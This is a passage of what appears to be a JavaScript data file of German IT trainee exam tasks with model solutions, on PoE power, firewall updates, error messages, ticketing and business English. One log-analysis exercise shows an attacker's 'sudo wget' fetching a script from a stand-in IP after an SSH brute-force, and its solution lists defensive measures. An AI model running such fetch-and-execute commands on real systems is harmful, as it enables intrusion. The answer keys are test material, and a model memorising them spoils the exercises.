      solution: `<p><strong>a)</strong> <em>IR range up to 40 m</em>: Die Kamera hat eine Infrarot-Beleuchtung für Nachtsicht; sie reicht unter guten Bedingungen bis zu 40 m weit. <em>Heater activates below 0 °C</em>: Eine eingebaute Heizung schaltet sich bei Frost ein, damit Elektronik und Objektiv nicht vereisen oder beschlagen. <em>IP67</em>: Schutzart – staubdicht (6) und geschützt gegen zeitweiliges Untertauchen (7); die Kamera ist damit für den Außeneinsatz geeignet.</p>
        <p><strong>b)</strong> Nein. 802.3af liefert am Endgerät höchstens 12,95 W. Ohne Heizung (7 W) würde das reichen, aber im Winter schaltet sich die Heizung ein und die Kamera braucht bis zu 19 W &gt; 12,95 W. Die Kamera könnte dann ausfallen oder neu starten. Lösung: PoE+-Switch (802.3at, bis 25,5 W am Gerät), PoE+-Injektor oder separates 12-V-Netzteil.</p>
        <p><strong>c)</strong> I = P ÷ U = 19 W ÷ 48 V ≈ 0,396 A ≈ <strong>396 mA</strong></p>
        <p><strong>d)</strong> 120 W ÷ 30 W pro Port = <strong>4 Kameras</strong>. (Nach der tatsächlichen Maximalaufnahme wären es 120 W ÷ 19 W ≈ 6,3, also 6 Kameras. Der Switch reserviert aber die volle Class-4-Leistung, deshalb sind nur 4 Kameras sicher.)</p>
        <p><strong>e)</strong> Datenrate je Kamera: 6 Mbit/s = 6.000.000 bit/s ÷ 8 = 750.000 Byte/s<br>Zeit: 14 d × 86.400 s/d = 1.209.600 s<br>Je Kamera: 750.000 B/s × 1.209.600 s = 907.200.000.000 Byte<br>4 Kameras: 3.628.800.000.000 Byte<br>÷ 2³⁰ = <strong>≈ 3.379,58 GiB</strong> · ÷ 2⁴⁰ = <strong>≈ 3,30 TiB</strong></p>`
    },
    {
      id: "e-doc-2",
      topic: "datenblatt-manual",
      title: "Release Notes einer Firewall: welches Update wann?",
      level: 2,
      exam: ["AP2"],
      task: `<p>Die Werft Brunsbüttel GmbH betreibt eine Firewall mit NorthGate OS 6.4.1. Der Außendienst nutzt das SSL-VPN, und zwei Standortverbindungen zur Niederlassung laufen über IPsec mit IKEv1. Der Hersteller veröffentlicht:</p>
        <pre><code>NorthGate OS 7.0.0 (2026-09-10)
BREAKING CHANGES
- IPsec IKEv1 has been removed. Existing IKEv1 tunnels will
  stop working after the upgrade.
- The legacy web interface (port 8080) has been removed.
Added
- WireGuard VPN support.
Deprecated
- SSL-VPN will be removed in 8.0.0. Migrate to WireGuard or IPsec IKEv2.

NorthGate OS 6.4.3 (2026-09-10)
Security
- Fixed a critical vulnerability in the SSL-VPN portal
  (remote code execution). Update immediately.
Fixed
- DHCP relay no longer crashes when option 82 is enabled.
Known issues
- The dashboard may show wrong CPU values. Workaround: reload the page.</code></pre>
        <p>a) Welche Version empfiehlst du kurzfristig? Begründe mit Angaben aus den Release Notes. (3 Punkte)</p>
        <p>b) Begründe, warum ein sofortiges Upgrade auf 7.0.0 für die Werft riskant wäre. (2 Punkte)</p>
        <p>c) Erkläre auf Deutsch: <em>breaking change</em>, <em>deprecated</em>, <em>known issue</em>, <em>workaround</em>. (4 Punkte)</p>
        <p>d) Beschreibe in drei Schritten, wie die Werft sich auf Version 8.0.0 vorbereiten sollte. (3 Punkte)</p>`,
      solution: `<p><strong>a)</strong> Kurzfristig <strong>6.4.3</strong>. Die Version schließt eine kritische Lücke im SSL-VPN-Portal, über die Angreifer Code aus der Ferne ausführen können (<em>remote code execution</em>). Die Werft nutzt genau dieses SSL-VPN, deshalb heißt es „Update immediately“. Als Patch-Version (6.4.1 → 6.4.3) enthält sie nur Korrekturen und ist kompatibel, die bestehenden VPNs laufen weiter.</p>
        <p><strong>b)</strong> 7.0.0 ist eine neue Hauptversion mit <em>breaking changes</em>: IKEv1 wurde entfernt. Die beiden Standortverbindungen würden nach dem Upgrade sofort ausfallen. Außerdem gibt es die alte Weboberfläche auf Port 8080 nicht mehr; Lesezeichen oder Skripte, die sie nutzen, funktionieren dann nicht mehr.</p>
        <p><strong>c)</strong> <em>breaking change</em>: inkompatible Änderung – bestehende Konfigurationen oder Funktionen arbeiten danach nicht mehr wie bisher. <em>deprecated</em>: abgekündigt – funktioniert noch, wird aber in einer späteren Version entfernt. <em>known issue</em>: bekannter, noch nicht behobener Fehler. <em>workaround</em>: Übergangslösung, mit der man den Fehler umgeht (hier: Seite neu laden).</p>
        <p><strong>d)</strong> (1) Die IKEv1-Tunnel in einem Wartungsfenster auf IPsec IKEv2 umstellen und testen (gemeinsam mit der Gegenstelle in der Niederlassung). (2) Die Außendienst-Clients vom SSL-VPN auf WireGuard (oder IKEv2) migrieren, Anleitung erstellen und Anwender schulen. (3) Erst danach auf 7.x aktualisieren – vorher Konfiguration sichern, Rollback planen – und später auf 8.0.0, wenn das SSL-VPN nicht mehr benötigt wird.</p>`
    },
    {
      id: "e-err-1",
      topic: "fehlermeldungen",
      title: "Sechs Fehlermeldungen deuten",
      level: 2,
      exam: ["AP1", "AP2"],
      task: `<p>Im Service Desk der Nordlicht IT GmbH gehen an einem Vormittag Meldungen der Nordsee-Reha-Klinik in St. Peter-Ording ein. Die Anwender schicken Screenshots mit folgenden Ausgaben (Klinik-Netz 10.10.0.0/24, Gateway 10.10.0.1, Fileserver 10.10.0.20):</p>
        <ol>
          <li><code>ping 10.10.0.20</code> funktioniert, aber <code>ping fileserver</code> meldet: <em>Ping request could not find host fileserver. Please check the name and try again.</em></li>
          <li><code>ssh admin@10.10.0.5</code> meldet: <em>ssh: connect to host 10.10.0.5 port 22: Connection refused</em></li>
          <li>Im Browser erscheint beim Aufruf von <code>intranet/hr/</code>: <em>403 Forbidden</em></li>
          <li><code>ipconfig</code> zeigt beim Ethernet-Adapter: <em>Media State . . . : Media disconnected</em></li>
          <li>In der PowerShell: <em>The term 'Get-ADUser' is not recognized as the name of a cmdlet, function, script file, or operable program.</em></li>
          <li>Beim Speichern eines Berichts auf einem Linux-Server: <em>No space left on device</em></li>
        </ol>
        <p>Gib zu jeder Meldung die Bedeutung auf Deutsch, eine wahrscheinliche Ursache und einen sinnvollen nächsten Schritt an. (je 2 Punkte)</p>`,
      hints: ["Achte auf die Schlüsselwörter: could not find host, refused, forbidden, disconnected, not recognized, no space."],
      solution: `<table><thead><tr><th>Nr.</th><th>Bedeutung</th><th>Wahrscheinliche Ursache</th><th>Nächster Schritt</th></tr></thead><tbody>
          <tr><td>1</td><td>Der Name „fileserver“ konnte nicht aufgelöst werden.</td><td>DNS-Problem: falscher DNS-Server am Client, fehlender DNS-Eintrag oder fehlendes DNS-Suffix. Die IP-Verbindung selbst funktioniert (ping auf die IP klappt).</td><td>DNS-Einstellungen mit <code>ipconfig /all</code> prüfen, <code>nslookup fileserver</code> testen, ggf. <code>ipconfig /flushdns</code> bzw. DNS-Eintrag anlegen.</td></tr>
          <tr><td>2</td><td>Verbindung abgelehnt: Der Rechner ist erreichbar, aber auf Port 22 nimmt kein Dienst Verbindungen an.</td><td>SSH-Dienst läuft nicht, lauscht auf einem anderen Port oder eine Host-Firewall lehnt ab.</td><td>Dienststatus prüfen (z. B. <code>systemctl status ssh</code>), Port und Firewall-Regeln prüfen.</td></tr>
          <tr><td>3</td><td>Zugriff verboten: Der Server hat die Anfrage verstanden, verweigert aber den Zugriff.</td><td>Der Benutzer ist nicht berechtigt (fehlende Gruppenmitgliedschaft für den HR-Bereich).</td><td>Berechtigung klären: Ist der Zugriff fachlich erlaubt? Dann Freigabe durch die Personalabteilung einholen und Gruppenmitgliedschaft anpassen.</td></tr>
          <tr><td>4</td><td>Kein Link am Netzwerkadapter („Medium getrennt“).</td><td>Patchkabel gezogen/defekt, Netzwerkdose oder Switch-Port ohne Verbindung.</td><td>Kabel und Link-LEDs prüfen, anderes Kabel/anderen Port testen, Patchfeld-Dokumentation prüfen.</td></tr>
          <tr><td>5</td><td>PowerShell kennt den Befehl nicht.</td><td>Das Modul ActiveDirectory (RSAT-Tools) ist auf dem Rechner nicht installiert oder nicht geladen; alternativ Tippfehler.</td><td>RSAT/AD-Modul installieren bzw. <code>Import-Module ActiveDirectory</code> ausführen, Schreibweise prüfen.</td></tr>
          <tr><td>6</td><td>Auf dem Datenträger ist kein Platz mehr frei.</td><td>Partition voll, z. B. durch große Logdateien oder alte Backups.</td><td>Belegung mit <code>df -h</code> und <code>du</code> prüfen, alte Dateien aufräumen/Logrotation einrichten, ggf. Speicher erweitern; Monitoring mit Schwellwert einrichten.</td></tr>
        </tbody></table>`
    },
    {
      id: "e-err-2",
      topic: "fehlermeldungen",
      title: "Logauszug eines Webservers analysieren",
      level: 3,
      exam: ["AP2"],
      task: `<p>Ein Kunde der Nordlicht IT GmbH, der Online-Shop „Deichgold“ aus Friedrichstadt, meldet merkwürdiges Verhalten seines Webservers. Du erhältst diesen Auszug aus den Logdateien:</p>
        <pre><code>2026-09-21T02:14:07+02:00 web01 sshd[3120]: Failed password for invalid user test from 198.51.100.23 port 40122 ssh2
2026-09-21T02:14:09+02:00 web01 sshd[3122]: Failed password for invalid user oracle from 198.51.100.23 port 40126 ssh2
2026-09-21T02:15:31+02:00 web01 sshd[3187]: Failed password for deploy from 198.51.100.23 port 40380 ssh2
2026-09-21T02:15:44+02:00 web01 sshd[3190]: Accepted password for deploy from 198.51.100.23 port 40388 ssh2
2026-09-21T02:16:02+02:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/x.sh
2026-09-21T02:20:00+02:00 web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=192.0.2.10 PROTO=TCP SPT=51544 DPT=3389</code></pre>
        <p>a) Beschreibe auf Deutsch, was zwischen 02:14 und 02:16 Uhr passiert ist. (4 Punkte)</p>
        <p>b) Erkläre die Bedeutung von <em>invalid user</em> und <em>Accepted password</em>. (2 Punkte)</p>
        <p>c) Deute die letzte Zeile. Handelt es sich um denselben Vorfall? (2 Punkte)</p>
        <p>d) Nenne vier Sofortmaßnahmen und drei vorbeugende Maßnahmen. (7 Punkte)</p>`,
      solution: `<p><strong>a)</strong> Von der IP-Adresse 198.51.100.23 aus wurden in kurzen Abständen SSH-Anmeldungen mit verschiedenen Benutzernamen versucht (<em>test</em>, <em>oracle</em>) – ein automatisierter Brute-Force- bzw. Wörterbuchangriff. Um 02:15:44 Uhr war die Anmeldung als Benutzer <em>deploy</em> mit Passwort erfolgreich. 18 Sekunden später hat der Angreifer mit <code>sudo</code> als root das Programm <code>wget</code> ausgeführt und ein Skript (<code>x.sh</code>) von seinem eigenen Server heruntergeladen. Der Server muss als <strong>kompromittiert</strong> gelten.</p>
        <p><strong>b)</strong> <em>invalid user</em>: Den Benutzernamen gibt es auf dem System gar nicht – der Angreifer rät typische Namen. <em>Accepted password</em>: Das Passwort war korrekt, die Anmeldung wurde angenommen.</p>
        <p><strong>c)</strong> Die Firewall (UFW) hat eine eingehende TCP-Verbindung von 203.0.113.9 auf Port 3389 (RDP) blockiert. Das ist ein anderer Absender und ein typischer, automatisierter Scan aus dem Internet. Die Firewall hat hier korrekt gearbeitet; ein Zusammenhang mit dem SSH-Einbruch ist aus dem Log nicht erkennbar.</p>
        <p><strong>d)</strong> Sofortmaßnahmen: (1) Server vom Netz trennen bzw. isolieren, aber nicht einfach neu installieren (Beweise sichern). (2) Kennwort des Kontos <em>deploy</em> und aller privilegierten Konten ändern, aktive Sitzungen beenden. (3) Heruntergeladenes Skript und Änderungen analysieren (neue Benutzer, Cronjobs, SSH-Schlüssel), ggf. Neuaufsetzen aus einem sauberen Backup. (4) Kunden und Verantwortliche informieren; wurden personenbezogene Daten (Kundendaten des Shops) betroffen, muss der Shop als Verantwortlicher die Datenpanne nach Art. 33 DSGVO innerhalb von 72 Stunden der Aufsichtsbehörde melden.</p>
        <p>Vorbeugend: (1) SSH nur mit Schlüssel (<code>PasswordAuthentication no</code>), kein root-Login. (2) SSH nicht offen ins Internet, sondern nur über VPN oder für feste IP-Adressen. (3) Fail2ban o. Ä. gegen Brute Force, sudo-Rechte für <em>deploy</em> auf das Nötige beschränken (Least Privilege), Log-Monitoring mit Alarmierung.</p>`
    },
    {
      id: "e-support-1",
      topic: "support-kommunikation",
      title: "Support-Telefonat auf Englisch vervollständigen",
      level: 2,
      exam: ["AP1"],
      task: `<p>Die Nordlicht IT GmbH betreut auch die dänische Partnerfirma Havn Logistik ApS in Esbjerg. Ein Mitarbeiter ruft im Service Desk an.</p>
        <p>a) Ergänze die Lücken (1)–(8) mit passenden englischen Redemitteln. Die deutschen Hinweise sagen dir, was gemeint ist. (8 Punkte)</p>
        <p><strong>Agent:</strong> (1) <em>[Begrüßung mit Firmenname und eigenem Namen, Hilfe anbieten]</em><br>
        <strong>Caller:</strong> Hi, this is Mads Sørensen from Havn Logistik. I can't connect to the VPN.<br>
        <strong>Agent:</strong> (2) <em>[Bedauern ausdrücken]</em> Could I have your customer number, please?<br>
        <strong>Caller:</strong> It's 30-417.<br>
        <strong>Agent:</strong> Thank you. (3) <em>[Fragen, seit wann das Problem besteht]</em><br>
        <strong>Caller:</strong> Since this morning. Yesterday it worked fine.<br>
        <strong>Agent:</strong> (4) <em>[Fragen, ob eine Fehlermeldung erscheint und ob er sie vorlesen kann]</em><br>
        <strong>Caller:</strong> Yes, it says “authentication failed”.<br>
        <strong>Agent:</strong> (5) <em>[Höflich bitten, das Passwort im Webportal zu testen]</em><br>
        <strong>Caller:</strong> Hm, the portal says my password has expired.<br>
        <strong>Agent:</strong> That explains it. (6) <em>[Anleiten: auf „Change password“ klicken und ein neues Passwort wählen]</em><br>
        <strong>Caller:</strong> Done – the VPN works again!<br>
        <strong>Agent:</strong> (7) <em>[Fragen, ob man sonst noch helfen kann]</em><br>
        <strong>Caller:</strong> No, that's all. Thanks a lot!<br>
        <strong>Agent:</strong> (8) <em>[Verabschiedung]</em></p>
        <p>b) Erkläre auf Deutsch, was „authentication failed“ bedeutet und warum ein abgelaufenes Passwort dazu führt. (2 Punkte)</p>`,
      solution: `<p><strong>a)</strong> Mögliche Lösungen (andere passende Formulierungen sind ebenfalls richtig):</p>
        <ol>
          <li>Good morning, Nordlicht IT service desk, this is Lena speaking. How can I help you?</li>
          <li>I'm sorry to hear that. / Oh, I'm sorry about that.</li>
          <li>When did the problem start? / Since when have you had this problem?</li>
          <li>Do you get an error message? Could you read it out to me, please?</li>
          <li>Could you please try to log in to the web portal with your password? / Would you mind testing your password in the web portal?</li>
          <li>Please click on “Change password” and choose a new password.</li>
          <li>Is there anything else I can help you with?</li>
          <li>You're welcome. Thank you for calling and have a nice day. Goodbye!</li>
        </ol>
        <p><strong>b)</strong> „Authentication failed“ heißt „Authentifizierung fehlgeschlagen“: Der VPN-Server konnte die Identität des Benutzers nicht bestätigen. Weil das Passwort abgelaufen war, wurde es nicht mehr als gültiger Nachweis akzeptiert. Erst nach der Passwortänderung ist die Anmeldung wieder möglich.</p>`
    },
    {
      id: "e-support-2",
      topic: "support-kommunikation",
      title: "Ticket auf Englisch anlegen und priorisieren",
      level: 2,
      exam: ["AP1"],
      task: `<p>Das Hotel Strandperle in St. Peter-Ording ist Kunde der Nordlicht IT GmbH. Das Ticketsystem wird auch vom Service-Team eines Partners in Dänemark genutzt, deshalb werden Tickets auf Englisch geschrieben. Deine Notizen vom Anruf:</p>
        <ul>
          <li>seit 7:30 Uhr im ganzen Haus kein Gäste-WLAN; Mitarbeiter-LAN funktioniert</li>
          <li>WLAN-Controller zeigt für alle 12 Access Points „offline“</li>
          <li>heute Nacht gab es einen kurzen Stromausfall</li>
          <li>Gäste beschweren sich an der Rezeption; keine Übergangslösung</li>
          <li>bisher geprüft: Controller neu gestartet – ohne Erfolg</li>
        </ul>
        <p>Prioritätsmatrix des Service Desks:</p>
        <table><thead><tr><th>Impact \\ Urgency</th><th>high</th><th>medium</th><th>low</th></tr></thead><tbody>
          <tr><td>high</td><td>1 – critical</td><td>2 – high</td><td>3 – medium</td></tr>
          <tr><td>medium</td><td>2 – high</td><td>3 – medium</td><td>4 – low</td></tr>
          <tr><td>low</td><td>3 – medium</td><td>4 – low</td><td>5 – planning</td></tr>
        </tbody></table>
        <p>a) Schreibe das Ticket auf Englisch mit den Feldern <em>Summary, Description, Actions taken, Impact, Urgency, Priority</em>. (6 Punkte)</p>
        <p>b) Nenne eine naheliegende technische Ursache und die nächste Prüfung. (2 Punkte)</p>`,
      solution: `<p><strong>a)</strong> Beispiel:</p>
        <ul>
          <li><strong>Summary:</strong> Guest Wi-Fi down in the entire hotel – all 12 access points offline</li>
          <li><strong>Description:</strong> Since 7:30 a.m., guests have not been able to connect to the guest Wi-Fi anywhere in the hotel. The staff LAN is working. The WLAN controller shows all 12 access points as offline. There was a short power outage last night.</li>
          <li><strong>Actions taken:</strong> The WLAN controller has been restarted – no improvement.</li>
          <li><strong>Impact:</strong> high – all guests are affected and are complaining at the reception; no workaround available.</li>
          <li><strong>Urgency:</strong> high – the hotel is operating, the problem affects the service to customers right now.</li>
          <li><strong>Priority:</strong> 1 – critical</li>
        </ul>
        <p><strong>b)</strong> Alle Access Points sind gleichzeitig offline, und das Mitarbeiter-LAN läuft. Naheliegend ist daher, dass der <strong>PoE-Switch</strong>, über den die Access Points versorgt werden, nach dem Stromausfall nicht korrekt hochgefahren ist, abgeschaltet ist oder PoE deaktiviert hat (z. B. Sicherung, Netzteil). Nächste Prüfung: Status und PoE-Anzeige des Switches bzw. Switch-Ports prüfen, Stromversorgung des Switches kontrollieren.</p>`
    },
    {
      id: "e-support-3",
      topic: "support-kommunikation",
      title: "Englische Ticket-Historie auswerten und SLA prüfen",
      level: 2,
      exam: ["AP1"],
      task: `<p>Die Nordlicht IT GmbH in Heide betreut das Lager der Havn Logistik ApS in Esbjerg. Das Ticketsystem führt die Historie auf Englisch. Deine Ausbilderin bittet dich, folgendes Ticket für die Monatsauswertung zu prüfen:</p>
        <pre><code>Ticket INC-20417 | Category: Network | Priority: P2 - high
Opened: Mon 2026-09-21 08:12 via phone
08:12  New          Warehouse users cannot scan. Scanner message:
                    "Server not reachable". Printing works.
08:19  Assigned     1st level (A. Jensen)
08:31  In progress  Remote check: scanner has IP 169.254.18.7
08:44  Escalated    to 2nd level network team
09:05  Pending      waiting for on-site technician
10:20  In progress  Root cause: DHCP relay on core switch was
                    disabled by last night's firmware update.
                    Relay re-enabled.
10:32  Resolved     All 6 scanners online. User asked to confirm.
Wed 2026-09-23 10:32  Closed (no reply from user within 48 hours)

SLA P2: response within 30 min, resolution within 4 h.
Response = first status "In progress".
The SLA clock keeps running while a ticket is pending.</code></pre>
        <p>a) Übersetze die Status <em>New, Assigned, In progress, Escalated, Pending, Resolved</em> und <em>Closed</em>. Erkläre, warum zwischen <em>Resolved</em> und <em>Closed</em> zwei Tage liegen. (4 Punkte)</p>
        <p>b) Prüfe rechnerisch, ob Reaktions- und Lösungszeit das SLA einhalten. (4 Punkte)</p>
        <p>c) Erkläre, was die Adresse 169.254.18.7 aussagt und wie sie mit der gefundenen Ursache zusammenhängt. (3 Punkte)</p>
        <p>d) Die Scanner waren schon nach dem vorigen Firmware-Update ausgefallen. Erläutere mit den ITIL-Begriffen <em>incident</em>, <em>problem</em> und <em>change</em>, wie der Service Desk jetzt weiter vorgehen sollte. (3 Punkte)</p>
        <p>e) Handelt es sich bei der Weitergabe um 08:44 Uhr um eine funktionale oder eine hierarchische Eskalation? Begründe. (1 Punkt)</p>`,
      hints: ["Rechne alle Zeiten ab 08:12 Uhr (Opened).", "169.254.0.0/16 ist der Adressbereich für APIPA."],
      solution: `<p><strong>a)</strong> <em>New</em> = neu angelegt · <em>Assigned</em> = einem Bearbeiter bzw. Team zugewiesen · <em>In progress</em> = in Bearbeitung · <em>Escalated</em> = an eine höhere Support-Ebene weitergegeben · <em>Pending</em> = wartend (hier auf den Techniker vor Ort) · <em>Resolved</em> = gelöst, die Bestätigung des Anwenders steht noch aus · <em>Closed</em> = abgeschlossen. Nach <em>Resolved</em> hat der Anwender 48 Stunden Zeit, die Lösung zu bestätigen oder das Ticket wieder zu öffnen (<em>reopen</em>). Weil keine Rückmeldung kam, hat das System das Ticket am 23.09. um 10:32 Uhr automatisch geschlossen.</p>
        <p><strong>b)</strong> Reaktionszeit: 08:12 → 08:31 Uhr = <strong>19 min</strong> ≤ 30 min → eingehalten.<br>Lösungszeit: 08:12 → 10:32 Uhr = 2 h 20 min = <strong>140 min</strong> ≤ 4 h = 240 min → eingehalten (Puffer 240 − 140 = 100 min).<br>Die Wartezeit von 09:05 bis 10:20 Uhr (75 min) läuft laut SLA weiter und ist in den 140 min bereits enthalten.</p>
        <p><strong>c)</strong> 169.254.x.x ist eine <strong>APIPA-Adresse</strong> (Automatic Private IP Addressing). Ein Client gibt sie sich selbst, wenn er keinen DHCP-Server erreicht; damit kann er den Server nicht ansprechen. Dass ein DHCP-Relay nötig ist, zeigt: Der DHCP-Server steht in einem anderen Subnetz bzw. VLAN als die Scanner. Das Relay am Core-Switch leitet ihre DHCP-Broadcasts an den Server weiter. Weil das Firmware-Update das Relay abgeschaltet hatte, bekamen die Scanner keine gültige Adresse.</p>
        <p><strong>d)</strong> Der heutige Ausfall ist ein <strong>incident</strong>; er wurde durch das Wiedereinschalten des Relays behoben. Da derselbe Fehler wiederholt nach Firmware-Updates auftritt, sollte ein <strong>problem</strong> angelegt werden, um die Grundursache (<em>root cause</em>) zu untersuchen, z. B. ob das Update die Relay-Konfiguration zurücksetzt. Bis zur endgültigen Lösung wird der Fall als <em>known error</em> mit Workaround in der Wissensdatenbank dokumentiert („Relay nach jedem Update prüfen und aktivieren“). Die dauerhafte Lösung – etwa eine korrigierte Firmware oder eine Update-Checkliste mit Test der DHCP-Funktion – wird als <strong>change</strong> geplant, getestet und freigegeben.</p>
        <p><strong>e)</strong> Eine <strong>funktionale</strong> Eskalation: Das Ticket geht an ein Team mit mehr Fachwissen (2nd-Level-Netzwerkteam), nicht an Vorgesetzte oder das Management.</p>`
    },
    {
      id: "e-mail-1",
      topic: "business-emails",
      title: "Auf eine englische Beschwerde antworten",
      level: 3,
      exam: ["AP1"],
      task: `<p>Am Montag, 28. September 2026, erhält die Nordlicht IT GmbH folgende E-Mail:</p>
        <p><em>„Dear Sir or Madam, I am writing to complain about the remote maintenance that was booked for Saturday, 26 September. Nobody from your company contacted us, and the update of our warehouse scanners was not carried out. As a result, three scanners did not work this morning and our staff had to process all deliveries manually. I expect an explanation and a new appointment as soon as possible. Yours faithfully, Karen Holm, IT Coordinator, Havn Logistik ApS, Esbjerg“</em></p>
        <p>Intern hast du erfahren: Der zuständige Techniker war am Samstag krank, die Vertretung wurde versehentlich nicht informiert. Die Wartung kann am Mittwoch, 30. September, ab 18:00 Uhr nachgeholt werden. Die Geschäftsführung erlaubt dir, die Wartungspauschale für diesen Termin zu erlassen.</p>
        <p>a) Schreibe eine vollständige Antwort-E-Mail auf Englisch (Betreff, Anrede, Entschuldigung, Erklärung, Lösung, Entgegenkommen, Schluss, Grußformel, Signatur). (10 Punkte)</p>
        <p>b) Nenne zwei Formulierungen, die du in dieser Situation vermeiden solltest, und begründe. (2 Punkte)</p>`,
      hints: ["Name bekannt → Dear Ms Holm … Kind regards / Yours sincerely", "Erst entschuldigen, dann erklären, dann eine konkrete Lösung mit Datum und Uhrzeit anbieten."],
      solution: `<p><strong>a)</strong> Musterlösung:</p>
        <p>Subject: Your complaint about the missed remote maintenance on 26 September</p>
        <p>Dear Ms Holm,</p>
        <p>Thank you for your email of 28 September. I am very sorry that the remote maintenance of your warehouse scanners was not carried out on Saturday and that your staff had to process the deliveries manually this morning.</p>
        <p>Unfortunately, the technician responsible for your appointment was ill on Saturday, and due to an internal mistake his replacement was not informed. We apologise for this and have already changed our planning process so that every appointment has a named stand-in.</p>
        <p>We would like to carry out the maintenance on Wednesday, 30 September, from 6 p.m. Could you please confirm by Tuesday noon whether this time suits you? As a gesture of goodwill, we will not charge the maintenance fee for this appointment.</p>
        <p>If you have any further questions, please do not hesitate to contact me directly on +49 481 000000.</p>
        <p>Kind regards,<br>Jonas Petersen<br>Service Desk<br>Nordlicht IT GmbH, Heide, Germany</p>
        <p>Bewertet werden: sachlicher Betreff mit Bezug, korrekte Anrede mit Namen (Ms), Dank und Entschuldigung, kurze ehrliche Erklärung ohne Schuldzuweisung, konkreter Termin mit Bitte um Bestätigung, Entgegenkommen, Angebot für Rückfragen, passende Grußformel (bei bekanntem Namen <em>Kind regards</em> oder <em>Yours sincerely</em>, nicht <em>Yours faithfully</em>), Signatur.</p>
        <p><strong>b)</strong> Zum Beispiel: (1) „It was not our fault, our technician was ill.“ – wirkt wie eine Ausrede und schiebt die Verantwortung ab; besser ist eine Entschuldigung mit Erklärung. (2) „We will do it ASAP.“ – zu umgangssprachlich und unverbindlich; die Kundin braucht einen konkreten Termin. Ebenfalls ungeeignet: „Calm down“ oder Schreiben in Großbuchstaben (wirkt aggressiv).</p>`
    },
    {
      id: "e-mail-2",
      topic: "business-emails",
      title: "Eine missglückte Anfrage-Mail verbessern",
      level: 2,
      exam: ["AP1"],
      task: `<p>Tim, neuer Auszubildender der Nordlicht IT GmbH, soll bei einem britischen Lieferanten ein Angebot für Notebooks anfragen. Sein Entwurf (ohne Betreff):</p>
        <pre><code>hey,
i want to become an offer for 20 notebooks ASAP. the actual
model we use is to slow. send it to me.
thanks
Tim</code></pre>
        <p>a) Nenne acht Fehler oder Schwächen des Entwurfs. (4 Punkte)</p>
        <p>b) Schreibe die E-Mail neu – formell, vollständig und mit konkreten Angaben (Empfängername unbekannt). (6 Punkte)</p>`,
      solution: `<p><strong>a)</strong> (1) Betreff fehlt. (2) „hey“ ist für eine Erstanfrage zu informell. (3) „i“ und Satzanfänge klein geschrieben – im Englischen wird „I“ immer groß geschrieben. (4) „want“ wirkt fordernd → „would like“. (5) False Friend: „become“ heißt „werden“, nicht „bekommen“ → „receive“. (6) „ASAP“ ist umgangssprachlich und ohne konkrete Frist. (7) False Friend: „actual“ heißt „tatsächlich“, nicht „aktuell“ → „current“. (8) „to slow“ → „too slow“. (9) Befehlston „send it to me“ statt höflicher Bitte. (10) Es fehlen alle Anforderungen (Ausstattung, Menge, Liefertermin) und eine vollständige Signatur mit Firma.</p>
        <p><strong>b)</strong> Musterlösung:</p>
        <p>Subject: Request for quotation – 20 business notebooks</p>
        <p>Dear Sir or Madam,</p>
        <p>We are an IT service provider in Heide, Germany, and would like to replace the notebooks of one of our customers.</p>
        <p>Could you please send us a quotation for 20 business notebooks with the following specifications: 14-inch anti-glare display, at least 16 GB RAM, 512 GB SSD, USB-C with power delivery and a 3-year warranty? Please include your delivery time and payment terms.</p>
        <p>We would be grateful to receive your offer by Friday, 9 October 2026.</p>
        <p>I look forward to hearing from you.</p>
        <p>Yours faithfully,<br>Tim Behrens<br>Trainee, Purchasing<br>Nordlicht IT GmbH, Heide, Germany</p>`
    },
    {
      id: "e-praes-1",
      topic: "praesentieren",
      title: "Eine englische Kurzpräsentation vorbereiten",
      level: 2,
      exam: ["AP1", "AP2"],
      task: `<p>Die Nordlicht IT GmbH stellt dem Service-Team der dänischen Partnerfirma in Esbjerg ihr neues Ticketsystem vor. Du sollst eine 10-minütige Präsentation auf Englisch halten. Die Zuhörer sind Service-Desk-Mitarbeitende, die das alte System gut kennen.</p>
        <p>a) Beantworte die drei Planungsfragen (purpose, audience, key message) für diese Präsentation. (3 Punkte)</p>
        <p>b) Formuliere die Einleitung auf Englisch: Begrüßung, Thema, Agenda mit drei Punkten und Regel für Fragen. (4 Punkte)</p>
        <p>c) Formuliere zwei Überleitungen und einen Satz, mit dem du auf ein Diagramm verweist. (3 Punkte)</p>
        <p>d) Ein Zuhörer fragt nach den Lizenzkosten, die du nicht kennst. Wie reagierst du auf Englisch? (1 Punkt)</p>
        <p>e) Ein Mitschüler hat bei der Probe folgende Probleme: liest alles von den Folien ab, hält die Hände in den Hosentaschen, spricht sehr schnell, Folien mit je 12 Zeilen Text. Gib ihm vier konkrete Verbesserungstipps. (4 Punkte)</p>`,
      solution: `<p><strong>a)</strong> <em>Purpose:</em> informieren und überzeugen – das Team soll das neue System verstehen und gern nutzen. <em>Audience:</em> Fachleute aus dem Service Desk, die Tickets kennen, aber das neue System nicht; also keine Grundlagen erklären, sondern Unterschiede und Vorteile zeigen. <em>Key message:</em> „The new ticket system saves you time because routine requests are handled automatically.“</p>
        <p><strong>b)</strong> „Good morning, everyone, and thank you for joining us. My name is Lea Hansen, and I'm an apprentice at Nordlicht IT. Today I'm going to show you our new ticket system. I've divided my presentation into three parts. First, I'll explain why we changed the system. Then, I'll show you the most important new features. Finally, I'll talk about the next steps and the training dates. If you have any questions, please feel free to ask them at the end.“</p>
        <p><strong>c)</strong> Überleitungen: „That's all about the reasons for the change. Let's move on to the new features.“ · „This brings me to my last point: the next steps.“ Diagramm: „As you can see on this chart, the average response time has dropped from 38 to 14 minutes.“</p>
        <p><strong>d)</strong> „That's a good question. I'm afraid I don't have the exact figures with me, but I'll find out and get back to you by email tomorrow.“</p>
        <p><strong>e)</strong> (1) Frei sprechen mit Stichwortkarten; Folien nur als Stütze für das Publikum. (2) Offene Gesten, Hände sichtbar, aufrecht mit Gewicht auf beiden Füßen stehen. (3) Langsamer sprechen und nach wichtigen Aussagen bewusst Pausen machen; vorher mit Stoppuhr üben. (4) Eine Idee pro Folie, wenige Stichworte, große Schrift, lieber ein Diagramm oder Screenshot als Textblöcke. Zusätzlich: Blickkontakt mit dem ganzen Raum halten.</p>`
    },
    {
      id: "e-graf-1",
      topic: "prozesse-grafiken",
      title: "Reaktionszeiten auswerten und auf Englisch beschreiben",
      level: 2,
      exam: ["AP1"],
